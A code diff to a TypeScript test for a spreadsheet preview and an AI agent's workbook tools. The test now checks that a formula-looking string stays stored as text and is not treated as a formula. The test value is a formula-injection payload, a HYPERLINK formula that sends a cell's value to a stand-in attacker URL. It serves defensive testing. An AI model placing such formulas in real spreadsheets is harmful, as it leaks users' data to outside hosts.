@@ -48,20 +48,21 @@ test("the artifact spreadsheet preview and the agent's workbook tools share one 
       ["", "Northstar", "1742.42", "TRUE"],
     ]);
 
-    // Claim: an edit saved from the preview keeps cell types, so the agent's
-    // read tool sees numbers, booleans, formulas, and text exactly as typed.
+    // Claim: an edit saved from the preview keeps value types (number, boolean,
+    // leading-zero text) and never turns text into an executable formula, even
+    // when it looks like one.
     rows[2][2] = "1800";
-    rows.push(["", "Total", "=SUM(C3:C3)", "FALSE"]);
+    rows.push(["", "Total", '=HYPERLINK("https://attacker.invalid/?v="&C3,"view")', "FALSE"]);
     rows.push(["", "Zip", "02134", ""]);
     const saved = await serializeSpreadsheet("reports/pipeline.xlsx", rows);
     if (saved.kind !== "binary") throw new Error("expected a binary workbook");
     await writeFile(join(root, "reports", "pipeline.xlsx"), new Uint8Array(saved.data));
     const read = await tools.tool.spreadsheet_read.execute({ path: "reports/pipeline.xlsx", formulas: true });
     expect(read).toContain("| 3 | Northstar | 1800 | TRUE |");
-    expect(read).toContain("| 4 | Total | =SUM(C3:C3) | FALSE |");
+    expect(read).toContain('| 4 | Total | =HYPERLINK("https://attacker.invalid/?v="&C3,"view") | FALSE |');
     expect(read).toContain("| 5 | Zip | 02134 |  |");
     const inspected: unknown = JSON.parse(await tools.tool.spreadsheet_inspect.execute({ path: "reports/pipeline.xlsx" }));
-    expect(inspected).toMatchObject({ sheets: [expect.objectContaining({ usedRange: "B2:D5", formulas: 1 })] });
+    expect(inspected).toMatchObject({ sheets: [expect.objectContaining({ usedRange: "B2:D5", formulas: 0 })] });
 
     // Negative half: legacy formats no longer route into the in-app editor and
     // the editor says why instead of failing to parse them.
@@ -73,7 +74,7 @@ test("the artifact spreadsheet preview and the agent's workbook tools share one 
 
     evidence.recordAssertionEvidence(
       "The preview shows and saves the same workbook format the agent tools use",
-      "A workbook written by spreadsheet_write rendered as an A1-anchored grid with stored values; an edit saved from the preview came back through spreadsheet_read with a number, a formula, a boolean, and a leading-zero text cell intact; .xls and .ods route to an external opener with an explanation.",
+      "A workbook written by spreadsheet_write rendered as an A1-anchored grid with stored values; an edit saved from the preview came back through spreadsheet_read with a number, a boolean, and a leading-zero text cell intact and a formula-looking string stored as text; .xls and .ods route to an external opener with an explanation.",
       true,
     );
   } finally {
